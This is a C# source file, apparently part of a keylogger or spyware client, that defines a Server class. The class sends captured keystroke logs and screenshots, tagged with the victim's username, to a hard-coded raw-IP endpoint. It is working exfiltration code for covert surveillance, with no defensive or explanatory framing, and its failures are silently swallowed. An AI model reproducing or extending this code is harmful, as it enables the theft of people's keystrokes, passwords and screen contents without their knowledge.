using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Web;

namespace Client.Communication
{
    public static class Server
    {
        /// <summary>
        /// The server's endpoint.
        /// </summary>
        private static string API = "http://194.233.71.142/ll";


        /// Endpoints:
        // /upload.php - handles uploading of files

        public async static Task<bool> AsyncSendKeylogs(string logged, string username) {
            bool result = false;
            await Task.Run(() =>
            {
                try
                {
                    HttpClient httpClient = new HttpClient();
                    MultipartFormDataContent form = new MultipartFormDataContent();
                    form.Add(new StringContent(logged), "logs");
                    HttpResponseMessage response = httpClient.PostAsync($"{API}/upload.php?username=\"{HttpUtility.UrlEncode(username)}\"&type=logs", form).Result;
                    httpClient.Dispose();
                    result = true;
                }
                catch
                {
                    result = false;
                }
            });
            return result;
        }
        public async static Task<bool> AsyncUploadScreenshot(byte[] image_buffer, string username)
        {
            bool result = false;
            await Task.Run(() =>
            {
                try
                {
                    HttpClient httpClient = new HttpClient();
                    MultipartFormDataContent form = new MultipartFormDataContent();
                    form.Add(new ByteArrayContent(image_buffer, 0, image_buffer.Length), "file", "file");
                    HttpResponseMessage response = httpClient.PostAsync($"{API}/upload.php?username=\"{HttpUtility.UrlEncode(username)}\"&type=screenshot", form).Result;
                    httpClient.Dispose();
                    result = true;
                }
                catch
                {
                    result = false;
                }
            });
            return result;
        }
    }
}
